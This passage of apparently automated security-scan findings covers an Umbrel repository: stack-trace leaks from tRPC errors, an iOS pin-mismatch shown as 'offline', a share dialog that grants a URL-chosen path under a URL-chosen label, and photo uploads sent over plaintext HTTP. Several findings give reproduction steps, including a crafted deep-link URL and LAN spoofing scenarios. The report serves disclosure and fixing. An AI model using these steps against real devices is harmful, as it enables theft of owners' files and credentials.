6. [packages/umbreld/source/modules/server/index.ts:215–219](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L215-L219)
   The tRPC router is mounted at /trpc over HTTP and as the /trpc WebSocket target on the umbreld server that lan-ingress proxies the dashboard ports 80/443 to, so the error shape is reachable by any LAN/Tailscale/Tor peer without credentials.
7. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:1061–1063](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L1061-L1063)
   The dashboard proxy forwards every request on the public ports to `http://127.0.0.1:${upstreamPort}` (umbreld) unconditionally; authentication happens only inside umbreld's tRPC middleware, so the error responses reach the network peer.
8. [packages/umbreld/source/modules/hardware/routes.ts:30–35](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/routes.ts#L30-L35)
   Public (unauthenticated) procedures; checkInitialRaidSetupStatus and checkRaidMountFailure run internal code whose raw errors are forwarded with message and stack.
9. [packages/umbreld/source/modules/hardware/raid.ts:1176–1178](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1176-L1178)
   The stored first-boot Error (from user.register / config-store writes) is rethrown raw to the public procedure; tRPC wraps it as INTERNAL_SERVER_ERROR inheriting its message and stack and serialises both.
10. [packages/umbreld/source/modules/server/error-handler.ts:8–14](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/error-handler.ts#L8-L14)
   The project's own Express error handler deliberately returns a generic `{error: true}` body, showing the intended standard for this surface; the tRPC formatter is the path that departs from it.
11. [packages/umbreld/source/index.ts:197](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/index.ts#L197)
   umbreld's own notion of development mode is `NODE_ENV === 'development'`; the project never sets the variable to 'production', so the tRPC library's inverse default (`!== 'production'`) evaluates to development mode on real devices.

## Impact
Discloses server-internal stack traces (absolute source and node_modules paths under /opt/umbreld with line:column numbers fingerprinting the exact revision, module structure, framework internals) and, for public procedures that rethrow raw errors, internal runtime error messages with host paths, command lines and stderr. This is reconnaissance-grade information rather than secrets or user data; no integrity or availability effect.

## Reproduction steps
1. Any peer able to reach the dashboard ports (LAN, Tailscale, dashboard onion) sends a single tRPC request to a protected procedure — for example `GET /trpc/user.get` with no Authorization header — or to a public procedure whose internals fail, and reads `error.data.stack` and `error.message` from the JSON body. No credentials, no user interaction, deterministic on every shipped device because the systemd unit, launcher shim, Dockerfile and start script never set NODE_ENV=production. Depends on the pinned @trpc/server 11.18.0 defaulting isDev to `NODE_ENV !== 'production'` and including `data.stack` in that mode, which is its documented contract but could not be verified against node_modules in this checkout (stated as an assumption).

## Recommended fix
1. tRPC is initialised without an explicit isDev setting and the errorFormatter forwards shape.data unchanged, so the library's development-mode behaviour (serialising error.stack) applies on production devices where NODE_ENV is never set. Fix criteria: tRPC error responses sent over HTTP and WebSocket must never contain a `stack` field on shipped devices regardless of NODE_ENV, e.g. by passing `isDev: umbreld.developmentMode` to initTRPC.create() and/or deleting `stack` in the errorFormatter. Verify: an unauthenticated `GET /trpc/user.get` and a forced INTERNAL_SERVER_ERROR both return JSON whose `error.data` has no `stack` key when NODE_ENV is unset.
2. The errorFormatter forwards the `message` of non-TRPCError throwables (fs/execa/store errors) verbatim as INTERNAL_SERVER_ERROR responses, independent of NODE_ENV. Fix criteria: INTERNAL_SERVER_ERROR responses to external clients carry a generic message (with the original logged server-side only), matching the generic `{error: true}` body of the Express error handler; procedures that intentionally expose a message do so by throwing a TRPCError with an explicit message.
3. The production runtime does not declare its environment, so every dependency that keys debugging behaviour on NODE_ENV (tRPC, Express, others) runs in development mode on devices. Fix criteria: The umbrel.service unit or the umbreld launcher sets NODE_ENV=production for the daemon (while keeping the dev container's 'development' path), and umbreld's own developmentMode continues to be derived from an explicit 'development' value. Verify on a built image that `process.env.NODE_ENV === 'production'` inside the running daemon.

---
**Severity:** HIGH
**Status:** Open
**Category:** Information exposure through error message
**CWE:** [CWE-209](https://cwe.mitre.org/data/definitions/209.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258342

---

# Pinned-CA mismatch shown as "Couldn't connect" and steers user to discard pin and re-pair

## Details
UmbrelKit pins one device-local CA per saved Umbrel and `LocalHTTPSSessionDelegate` (LocalHTTPS.swift:257-275) cancels the TLS challenge of any peer whose chain does not anchor to that pin, so a LAN impostor answering for the saved `umbrel.local`/IPs cannot receive credentials. The iOS client then presents that rejection as the device being offline and offers pin removal as the remedy.

1. Main app: `MainModel.load()` (MainModel.swift:992-1033) wraps every pinned call in `try?`; `ConnectionState` (367-380) has no trust state, so when no saved endpoint verifies the state becomes `.unavailable` and Home.swift:171-178 shows "Can't reach your Umbrel - Make sure your Umbrel is turned on...". Sign-out (Profile.swift:119-125 -> MainModel.signOut) keeps the pin but deletes the session, so the saved card now routes to the sign-in sheet (RootView.swift:62-67).
2. Saved-device sheet (RootView.swift:79-100 -> `UmbrelSignInForm`): `loadAccounts()` (SignInSheet.swift:423-431) catches every error from `prepareSavedDeviceForSignIn`/`listAccounts(target:)`, including `Umbreld.Error(kind: .trust)`, and shows `.loadFailed`: "Couldn't connect - Make sure your Umbrel is online..." (211-219) with exactly two actions, "Try again" and "Remove from this iPhone" (301-313). The confirmation (147-153) says only that backups remain and the Umbrel can be added again. Removal runs `MainModel.removeSavedDevice` (2223-2251) -> `Umbreld.forgetLocalHTTPSIdentity`, which the kit documents as "the explicit operation that discards first-use trust" (Umbreld.swift:1036-1040).
3. Re-adding runs `identify(candidates:knownDeviceIds:)` with the id no longer saved (OnboardingModel.swift:250-270), i.e. first-use TOFU: `claimLocalHTTPSIdentity` pins whatever CA the answering host asserts and the sign-in form posts the owner's password and TOTP to it (the mechanics are the verified record first-use-pairing-impostor-pin-id-collision).

No iOS view consumes `Umbreld.Error.Kind.trust` or `isConnectivityFailure`; `LocalHTTPSTransportError.identityChanged`'s text (LocalHTTPS.swift:17-18) is never displayed and itself says "Remove it and add it again". Inside UmbrelKit the signal is also fragile: `verifyEndpoint` (Umbreld.swift:1549-1575) returns `.rejected(.trust)` for `LocalHTTPSTransportError` and server-trust `URLError`s but maps `URLError.cancelled` to `.unavailable`; because the delegate uses `.cancelAuthenticationChallenge` and the session pool records nothing, a pin mismatch is assumed (Foundation behaviour, iOS 17+/macOS 14+ SDK) to surface as `.cancelled`, in which case the trust rejection is already classified as connectivity before the UI. Either way the user never learns that a peer with a foreign identity is answering for their Umbrel.

Result: a LAN peer that answers for every saved LAN endpoint of a pinned device (mDNS answer for the .local name plus ARP spoofing of the saved IPs, or occupying them while the genuine device is down, with no reachable Tailscale route) makes the client show persistent offline messaging whose only on-screen repair is remove-and-re-add, which converts the pinned device back to the conceded TOFU state and delivers the password and TOTP to the impostor. The pin's purpose - making an identity change loud so re-trust is an informed decision - is defeated by the presentation layer. The macOS sibling (DeviceDetailView.swift:475-498, "Couldn't load accounts." beside forget()) is tracked separately; this record covers the iOS path. Distinct from first-use-pairing-impostor-pin-id-collision: there the pin is absent; here it is present, fires correctly, and the UI steers the user to discard it.

## Evidence
1. [clients/apple/ios/Sources/Onboarding/SignInSheet.swift:423–431](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Onboarding/SignInSheet.swift#L423-L431)
   UmbrelSignInForm.loadAccounts catches every error from onPrepare()/listAccounts(target:) - including Umbreld.Error(kind: .trust) raised when every saved host fails the Keychain CA pin - and maps it to .localNetworkDenied or .loadFailed; the trust kind and message are discarded.
2. [clients/apple/ios/Sources/Onboarding/SignInSheet.swift:211–219](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Onboarding/SignInSheet.swift#L211-L219)
   The .loadFailed screen reads "Couldn't connect - Make sure your Umbrel is online and your iPhone can reach it, then try again": a pin rejection is presented as the Umbrel being offline.
3. [clients/apple/ios/Sources/Onboarding/SignInSheet.swift:301–313](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Onboarding/SignInSheet.swift#L301-L313)
   On the saved-device sheet the only other action under that message is "Remove from this iPhone" (onRemove != nil), i.e. discard the pin that just correctly rejected the peer.
4. [clients/apple/ios/Sources/Onboarding/SignInSheet.swift:147–153](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Onboarding/SignInSheet.swift#L147-L153)
   The removal confirmation says only that backups remain and the Umbrel can be added again; nothing tells the user that removal discards the device's security identity or that an identity check just failed.
5. [clients/apple/ios/Sources/RootView.swift:79–100](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/RootView.swift#L79-L100)
   Saved-device sign-in: onPrepare is prepareSavedDeviceForSignIn (returns .alreadyEnrolled when a pin exists, so listAccounts must validate against it); onRemove calls MainModel.removeSavedDevice.
6. [clients/apple/ios/Sources/RootView.swift:62–67](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/RootView.swift#L62-L67)
   A saved device without a Keychain session (after Profile sign-out, which keeps the pin) routes straight to the sign-in sheet above, so the 'offline' main screen leads the troubleshooting user to the remove action.
7. [clients/apple/ios/Sources/Main/MainModel.swift:2223–2251](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Main/MainModel.swift#L2223-L2251)
   removeSavedDevice deletes the session and calls Umbreld.forgetLocalHTTPSIdentity, discarding the CA pin. The device must then be re-added through first-use (TOFU) pairing.
8. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:1036–1040](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L1036-L1040)
   The kit documents removal as 'the explicit operation that discards first-use trust' - the design relies on removal being an informed decision, which the UI above does not make possible.
9. [clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift:1549–1575](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Umbreld.swift#L1549-L1575)
   verifyEndpoint returns .rejected(.trust(...)) for LocalHTTPSTransportError and server-trust URLErrors (resolvePinnedHost rethrows as Umbreld.Error(kind: .trust)), but maps URLError.cancelled to .unavailable. Assumption (Foundation): a challenge the delegate cancels surfaces as .cancelled, so a pin mismatch may already be classified as connectivity here; the iOS UI drops the distinction in either case.
10. [clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift:257–274](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift#L257-L274)
   LocalHTTPSSessionDelegate answers a chain that fails SecTrustEvaluateWithError against the pinned anchor with .cancelAuthenticationChallenge and records nothing, so the transport has no explicit 'pin rejected' signal of its own and relies on the URLError Foundation produces.
11. [clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift:17–18](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/LocalHTTPS.swift#L17-L18)
   UmbrelKit's identityChanged text, never shown by the iOS app, itself instructs the user to "Remove it and add it again to reconnect" - the action that hands trust to whoever is currently answering.
12. [clients/apple/ios/Sources/Main/MainModel.swift:992–1033](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Main/MainModel.swift#L992-L1033)
   load() wraps every pinned call in try? and, when nothing answered, sets .localNetworkDenied or .unavailable; a trust rejection on every saved endpoint is indistinguishable here from an offline device.
13. [clients/apple/ios/Sources/Main/MainModel.swift:367–380](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Main/MainModel.swift#L367-L380)
   ConnectionState has only unverified/connected/unavailable/localNetworkDenied; no state represents a pin mismatch.
14. [clients/apple/ios/Sources/Main/Home.swift:166–187](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Main/Home.swift#L166-L187)
   Home renders .unavailable as "Can't reach your Umbrel - Make sure your Umbrel is turned on..."; a rogue peer answering for the saved name/IPs is indistinguishable from an offline device.
15. [clients/apple/ios/Sources/Onboarding/OnboardingModel.swift:250–269](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Onboarding/OnboardingModel.swift#L250-L269)
   After removal the id is no longer in savedIds, so re-adding runs identify(candidates:knownDeviceIds:) in first-use mode: whoever answers with a self-signed CA is pinned by claimLocalHTTPSIdentity when the user taps Connect.

## Impact
Once the user re-pairs, the owner's password and current TOTP code are posted to the impostor over a channel pinned to its CA (C:H) and the impostor's CA replaces the genuine pin for this device id, making it the app's trusted endpoint for all later traffic (I:H). Until then the client treats its genuine, still-pinned Umbrel as unreachable for as long as the impostor answers (A:L). Subsequent-system impact: The captured password and live TOTP code relayed to the genuine device through the public user.loginNative procedure (no pairing approval) yield an owner native session on the umbrelOS device: full control of its files, apps and settings.

## Reproduction steps
1. Attacker on the victim's LAN answers for every saved LAN endpoint of a pinned Umbrel (mDNS for the .local name plus ARP spoofing of the saved IPs, or occupying them while the genuine device is down; no reachable Tailscale route) with an HTTPS server using its own CA. Pinned probes fail and are displayed as 'offline'. Following the only guidance shown, the victim signs out, opens the saved device, taps Remove, re-adds it, and enters password and TOTP into first-use pairing against the impostor. Positional/race precondition (AT:P); several deliberate victim steps (UI:A); no credentials or technical control to bypass (PR:N, AC:L).

## Recommended fix
1. UmbrelSignInForm.loadAccounts and MainModel's connection-state mapping collapse Umbreld.Error(kind: .trust) / LocalHTTPSTransportError.identityChanged into generic connectivity failures, so a certificate-pin rejection is indistinguishable from an offline device. Fix criteria: A pin or identity-check failure for a saved device is surfaced as a distinct security warning (not 'offline') in both the main tabs and the saved-device sign-in sheet, and is not retried into or cached as an ordinary connectivity state. Verify by pointing the saved hostname at a host with a different CA: the app shows an identity-changed warning rather than 'Couldn't connect'.
2. The only recovery action offered alongside the misreported failure is 'Remove from this iPhone', which discards the pin and routes the user into first-use pairing where trust is self-asserted by the answering host. Fix criteria: When the identity check has failed, removal/re-pair is not presented as the remedy; re-trusting a changed identity requires an out-of-band confirmation (e.g. the CA fingerprint shown in the umbrelOS dashboard via lanIngress.getCertificateStatus) before any credential is sent. Verify that after a pin mismatch the user cannot complete sign-in to the new identity without confirming that fingerprint.
3. LocalHTTPSSessionDelegate rejects a non-anchored chain with .cancelAuthenticationChallenge and records nothing, while verifyEndpoint classifies URLError.cancelled as .unavailable, so the transport itself may report a pin mismatch as connectivity. Fix criteria: A server-trust rejection by the pinned delegate is reported by UmbrelKit as a trust rejection (e.g. the delegate records the failure and the transport throws LocalHTTPSTransportError.trustFailed/identityChanged) and never as .unavailable; a unit test drives a pinned request against a mismatching chain and asserts the trust classification.

---
**Severity:** HIGH
**Status:** Open
**Category:** UI misrepresentation
**CWE:** [CWE-451](https://cwe.mitre.org/data/definitions/451.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258341

---

# Files share-with-users dialog displays URL-supplied name while granting URL-supplied path

## Details
The Files 'Share with users' dialog (`ShareUsersDialog`) is driven entirely by URL query parameters: `?dialog=files-share-users&files-share-users-name=<label>&files-share-users-path=<dir>`. It renders a folder icon and the title 'Share "<label>" with users' from `files-share-users-name`, but when the owner flips a member's switch it calls the owner-only `files.addMemberShare` with `files-share-users-path`. The two values are never reconciled: the label is not derived from the path, the path is not required to be the folder the owner right-clicked, and nothing on screen shows the real path (only `/Home` gets a distinct note; `/Home/<anything>` and `/Apps/<app>` show generic text).

Attack: a member account (or anyone who can get the owner to open a dashboard link, e.g. a LAN peer sending a chat message) crafts a link such as `https://umbrel.local/files/Home?dialog=files-share-users&files-share-users-name=Vacation%20Photos&files-share-users-path=%2FHome%2FDocuments` or `...path=%2FApps%2F<appId>`. The owner, believing they are sharing a harmless folder the member asked for, opens the link and toggles that member on. The dashboard then grants the member full read/write access to the attacker-chosen directory: the owner's Documents, the whole /Home, or an app's data directory (which, per the verified finding `member-share-apps-directory-compose-root-escalation`, lets the member edit compose/exports.sh and escalate to host root).

This is a consent/grant flow whose displayed subject is attacker-controlled and whose effective subject is a different attacker-controlled value (CWE-451). The maintainers' own sibling `AppShareUsersDialog` avoids the problem by deriving the display name from the app id; the Files dialog should likewise derive the displayed name (and ideally show the full path/breadcrumb) from `path`, or carry only the path and look the item up.

The same name/path split exists in `ShareInfoDialog` (SMB share of `files-share-info-path` labelled by `files-share-info-name`), but Samba shares are restricted to the sharing account's own Samba user (`valid users` in samba.ts), so that variant has no cross-party victim and is not filed separately.

## Evidence
1. [packages/ui/src/features/files/components/dialogs/share-users-dialog/index.tsx:16–18](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/dialogs/share-users-dialog/index.tsx#L16-L18)
   The dialog reads two independent, unvalidated browser URL parameters via useSearchParams(): `files-share-users-path` (the directory that will be shared) and `files-share-users-name` (the label shown to the owner). Nothing checks that the name is the basename of the path or that the path is one the owner selected in the listing.
2. [packages/ui/src/features/files/components/dialogs/share-users-dialog/index.tsx:40–49](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/dialogs/share-users-dialog/index.tsx#L40-L49)
   writeShare() calls addMemberShare({path, sharedWith}) with the URL-supplied `path` as soon as the owner toggles a member switch (MemberSharePicker onChange); there is no confirmation step and the grant is the owner-only files.addMemberShare mutation.
3. [packages/ui/src/features/files/components/dialogs/share-users-dialog/index.tsx:56–68](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/dialogs/share-users-dialog/index.tsx#L56-L68)
   The header renders FileItemIcon and `t('files-share-users.title', {name})` from the URL-supplied `name`. Only `path === '/Home'` gets the home-note; any other path (e.g. /Home/Documents, /Home/<subdir>, /Apps/<app>) shows the generic 'Users get full access to this folder' text, and the full path is never displayed. FolderIcon only overlays a hint for /Home/{Videos,Downloads,Documents,Photos} and app roots; arbitrary subdirectories render as a plain folder.
4. [packages/ui/src/features/files/components/listing/listing-and-file-item-context-menu.tsx:225–232](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/listing/listing-and-file-item-context-menu.tsx#L225-L232)
   The intended producer of these parameters pairs item.name with item.path from the listing; the dialog relies on that pairing but a crafted link can supply any combination.
5. [packages/ui/src/utils/dialog.ts:100–117](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/utils/dialog.ts#L100-L117)
   useDialogOpenProps opens the dialog whenever the URL carries `?dialog=files-share-users`, so a crafted link opens it directly in the owner's authenticated dashboard session.
6. [packages/ui/src/modules/auth/redirects.tsx:113–124](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/auth/redirects.tsx#L113-L124)
   If the owner is not yet logged in, RedirectLogin snapshots pathname+search into `?redirect=` and getRedirectUrl() restores any same-origin path after login, so the deep link (including the dialog params) survives the login step; the owner need not already have a session open.
7. [packages/ui/src/features/files/index.tsx:115–124](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/index.tsx#L115-L124)
   ShareUsersDialog is mounted for every non-read-only Files session regardless of role flags, so it is reachable on any /files/* route the owner opens.
8. [packages/umbreld/source/modules/files/routes.ts:343–351](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/routes.ts#L343-L351)
   files.addMemberShare is a privateProcedure (= ownerProcedure, trpc.ts:31-34): the grant is an owner-only action, so the owner's deceived click is the control being bypassed.
9. [packages/umbreld/source/modules/files/member-shares.ts:188–207](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/member-shares.ts#L188-L207)
   The server accepts any existing directory under /Home (including /Home itself) or /Apps/<app>/** from the owner; it cannot distinguish a deliberate grant from one obtained through a mislabelled dialog.
10. [packages/ui/src/modules/desktop/app-share-users-dialog.tsx:19–24](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/modules/desktop/app-share-users-dialog.tsx#L19-L24)
   The sibling app-share dialog derives the displayed name and icon from the app list by id, which is the safe pattern the Files dialog does not follow.

## Impact
A successful grant gives the member full read and write access ('view, add, and edit files') to an owner directory of the attacker's choosing, up to the owner's entire /Home or an installed app's data directory (the latter chaining into the separately verified compose/exports.sh root escalation). Confidentiality and integrity of the owner's data are fully compromised for that subtree; availability is not directly affected beyond deletion already covered by integrity.

## Reproduction steps
1. Attacker: a member account of the device (the beneficiary of the grant), delivering a dashboard deep link to the owner over any channel. The owner opens it (the ?redirect= flow preserves the link through login); the dialog opens showing the attacker's label and a folder icon with no path; the owner toggles the attacker's switch; the UI issues the owner-only addMemberShare for the attacker's path. No confirmation step or label/path reconciliation stands in the way; the only requirement is that the owner performs the toggle, which the misleading label is designed to induce.

## Recommended fix
1. ShareUsersDialog trusts two independent URL parameters, rendering one (name) as the subject of the consent while acting on the other (path), so the owner's consent can be obtained for a directory other than the one displayed. Fix criteria: The dialog must present the directory it will actually share: derive the displayed name (and preferably a full breadcrumb/path) from the `path` parameter alone and drop the separate `name` parameter, or validate that `name` equals the basename of `path`. Verify that a link with a mismatched name and path either shows the real path or refuses to open, and that /Home and /Apps/<app> targets are visibly identified before any member switch can be toggled.
2. Privileged grant dialogs can be opened and pre-populated purely from a URL, so an external link can stage an owner-only consent action with attacker-chosen parameters. Fix criteria: Owner-only grant dialogs should only accept a target that the current session selected (e.g. from in-memory listing state) or should require the owner to re-confirm the exact target path on screen before the grant is sent. Verify that opening /files?dialog=files-share-users&files-share-users-path=/Home from a fresh navigation does not allow a one-click grant of /Home without the real path being shown.

---
**Severity:** HIGH
**Status:** Open
**Category:** UI misrepresentation
**CWE:** [CWE-451](https://cwe.mitre.org/data/definitions/451.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258138

---

# Photo backup sends perpetual bearer grant and media over plaintext HTTP to CGNAT literal

## Details
The iOS photo-backup pipeline sends the user's media and a long-lived bearer credential over cleartext HTTP with no server authentication, relying on the destination address class alone to imply an encrypted route.

MainModel.applyPhotoBackupConfiguration pins `uploadBaseURL = "http://<photoBackupHost>"`, where photoBackupHost is the first server-reported IPv4 literal in 100.64.0.0/10 (SavedDevice.photoBackupHost / isTailscaleAddress). The one identity check (Umbreld.isKnownEndpointAvailable, pinned-CA HTTPS) runs once at setup in the host app. BackgroundUploadExtension.destination(for:) then builds every PhotoKit job as `POST http://100.x.y.z/api/photos/upload` carrying `Authorization: Bearer <photo-backup grant>`, the resource metadata headers and the full-resolution photo/video bytes; PhotoKit's system daemon performs the upload outside the app's pinned transport. The only guard is PhotoBackupConfiguration.isTailscaleDestination (`scheme == http` and host in 100.64/10), which its own comment calls 'a destination policy, not route attestation'. Both Info.plists carry an ATS exception for 100.64.0.0/10. Nothing in the extension consults the route or interface (no NWPathMonitor, no utun/VPN check). The README's 'pauses without Tailscale' is implemented reactively: after a job fails with a connectivity error the extension still creates or retries one job as a reachability probe (creationLimit = 1 while connectivityRecovering, lines 302-315; probe retry, lines 198-209), and jobs already queued in PhotoKit keep running.

When the Tailscale tunnel on the iPhone is not up (app killed, user toggled it off, iOS tore it down) the device has no route for 100.64/10 and sends those packets over its default route - the current Wi-Fi gateway (uploads default to Wi-Fi only; allowsCellularAccess is false unless the user opts in). Whoever controls that segment - a rogue/evil-twin AP, a hotspot operator, an ARP-spoofing peer, or on carrier/ISP CGNAT networks whoever actually holds 100.x.y.z - can complete the TCP handshake and receive (1) photos/videos and (2) the photo-backup grant. Answering 200 with the echoed key header makes the probe 'succeed', which clears connectivityRecovering and reopens the full queue, so the library drains to the attacker.

What the grant buys: on the server the photo-backup credential is derived without expiresAt (#createDerivedCredential) and #isCredentialActive / #isSessionActive treat it and its native session as active indefinitely; the photos router and authorizePhotoBackupRequest apply no interface or origin restriction, and lan-ingress serves umbreld on plain port 80, so the captured grant authorizes POST /api/photos/upload into the victim account's backup folder from the LAN or Tailscale until the user disables backup or signs out.

Because responses are equally unauthenticated, an active responder also corrupts backup state: successfulReceipt(for:) accepts a job as uploaded when the response merely echoes `x-umbrel-photo-backup-key` plus a plausible `x-umbrel-upload-bytes`, and acknowledge() calls ledger.recordResourceSucceeded - the app reports assets as backed up that the Umbrel never received (silent backup loss). A forged `x-umbrel-photo-backup-error: insufficient-storage` sets storagePaused and halts the whole source until manual retry.

Secondary: getIpAddresses excludes only loopback and 169.254/16 and isTailscaleAddress is a bare range test, so an Umbrel whose own interface carries an ISP CGNAT address would be pinned as a 'Tailscale' destination and uploaded to over the open network even with Tailscale working.

Threat-model note: the recorded model lists 'native clients <-> server identity (local CA)' as a boundary and a rogue LAN device impersonating the server to the iOS app as an adversary; this path leaves the device with no identity check at all. 'HTTP on LAN is accepted' refers to the browser dashboard the user chooses to open, not to a background upload of a never-expiring credential plus the photo library. The project documents the design assumption ('HTTP inside Tailscale's authenticated WireGuard tunnel') but no user obligation to keep Tailscale always-on, and expects Tailscale to be down at times ('pauses without Tailscale').

Assumptions not verifiable in this checkout: with the Tailscale packet-tunnel provider disconnected iOS has no route for 100.64/10 and uses the default route (the Tailscale iOS app ships no kill switch by default); PhotoKit (iOS 26.5 deployment target) marks a PHAssetResourceUploadJob .succeeded on a 2xx response and exposes response headers via responseHeaderFields, as the extension's own receipt logic relies on.

## Evidence
1. [clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift:946–988](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/BackgroundUploadExtension/BackgroundUploadExtension.swift#L946-L988)
   destination(for:) builds every PhotoKit job as POST http://<100.x.y.z>/api/photos/upload carrying 'Authorization: Bearer <grant>', the resource metadata headers and the media bytes. The only guard is configuration.isTailscaleDestination plus scheme == http; there is no TLS, no server identity verification and no check that the route traverses the Tailscale interface. PhotoKit's system daemon performs the upload outside the app's pinned transport.
2. [clients/apple/UmbrelKit/Sources/UmbrelKit/Backup/PhotoBackup.swift:45–55](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/UmbrelKit/Sources/UmbrelKit/Backup/PhotoBackup.swift#L45-L55)
   isTailscaleDestination only verifies scheme == http and that the host literal is in 100.64.0.0/10; the comment states it is 'a destination policy, not route attestation: the client cannot cryptographically prove which route iOS used to reach that address'.
3. [clients/apple/ios/Sources/Main/MainModel.swift:1876–1899](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/clients/apple/ios/Sources/Main/MainModel.swift#L1876-L1899)
   Host app pins uploadBaseURL = "http://<photoBackupHost>". The pinned-HTTPS identity probe (Umbreld.isKnownEndpointAvailable) happens once here at setup; nothing re-verifies identity or route at upload time.
